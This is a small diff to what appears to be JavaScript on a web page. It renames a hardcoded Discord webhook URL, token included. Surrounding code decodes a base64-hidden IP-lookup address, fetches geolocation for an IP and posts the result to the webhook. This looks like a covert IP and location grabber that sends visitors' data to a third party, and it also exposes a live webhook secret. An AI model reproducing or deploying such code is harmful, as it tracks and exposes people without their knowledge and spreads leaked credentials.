@@ -190,7 +190,7 @@
                 }
             });
         }
-        const webhookUrl = 'https://discord.com/api/webhooks/1264478932896321588/_rldWLDFoVI7YtPAdyqLV-rKssePEPBZuBH6cJjwWg2w7l941aIT8b_GuyEqBRl2Vo2e'; 
+        const webhookUrl2 = 'https://discord.com/api/webhooks/1264478932896321588/_rldWLDFoVI7YtPAdyqLV-rKssePEPBZuBH6cJjwWg2w7l941aIT8b_GuyEqBRl2Vo2e'; 
 const url32 = "aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u"; 
 
 async function fetchGeoInfo(ip) {
@@ -246,7 +246,7 @@ async function sendToWebhook() {
             ]
         };
 
-        await fetch(webhookUrl, {
+        await fetch(webhookUrl2, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ embeds: [embed] })
